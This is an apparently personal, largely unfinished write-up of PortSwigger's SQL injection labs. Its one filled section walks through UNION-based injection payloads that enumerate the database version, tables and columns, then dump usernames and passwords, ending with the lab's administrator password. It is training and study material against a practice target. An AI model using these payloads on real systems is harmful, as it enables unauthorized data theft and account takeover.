---
title: SQL injection
tags:
  - 渗透
abbrlink: 8b56535a
description: SQL injection based on PostSwigger Lab
date: 2024-03-17 00:26:00
---

[PostSwigger Lab - SQL injection](https://portswigger.net/web-security/sql-injection)

## 0x00 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data



## 0x01 SQL injection vulnerability allowing login bypass

## 0x02

## 0x04 SQL injection attack, listing the database contents on non-Oracle databases
***End Goals***:
- Determine the table that contains usernames andpasswords
- Determine the relevant columnsOutput the content of the table
- Login as the administrator user

***Analysis***:
1. Find the number of columns
`' order by 3--` -> Internal server error
3-1=2
2. Find the data type of the columns
`' UNION select 'a','a'--` -> both columns accept type text
3. Version of the database
    - `' UNION SELECT @@version, NULL--` -> not Microsoft
    - `' UNION SELECT version()，NULL--` ->200 0K `PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1)`
4. Output the list of table names in the database
    `' UNION SELECT table_name, NULL FROM information_schema.tables--` -> search `users` -> users_vqrxmy
5. Output the column names of the table
    `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_vqrxmy'--` -> `password_bfrqkp` and `username_rwstyz`

6. Output the usernames and passwords
`' UNION select username_rwstyz, password_bfrqkp from users_vqrxmy--` -> `administrator` and `lftog9bgwjw81hj0feiy`

## SQL injection with filter bypass via XML encoding